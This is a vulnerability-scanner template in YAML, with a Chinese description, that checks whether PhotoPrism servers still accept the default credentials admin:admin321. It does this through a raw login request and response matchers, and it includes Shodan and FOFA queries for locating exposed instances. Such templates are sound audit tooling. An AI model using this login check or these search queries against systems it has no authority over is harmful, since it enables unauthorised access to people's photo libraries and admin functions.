id: photoprism-default-login

info:
  name: PhotoPrism 默认口令登录（弱口令）
  author: ritikchaddha
  severity: high
  description: |
    该模板通过尝试 PhotoPrism 的默认凭据（如 admin:admin321），并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统并访问相应管理功能或业务数据。
  reference:
    - https://docs.photoprism.app/getting-started/
  metadata:
    verified: true
    max-request: 2
    shodan-query: title:"PhotoPrism"
    fofa-query: title="PhotoPrism"
  tags: photoprism,default-login,misconfig,vuln

variables:
  username: admin
  password: admin321

http:
  - raw:
      - |
        POST /api/v1/session HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"{{username}}","password":"{{password}}","code":""}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains_all(body, "access_token\":", "config\":{")'
          - 'contains(content_type, "application/json")'
        condition: and
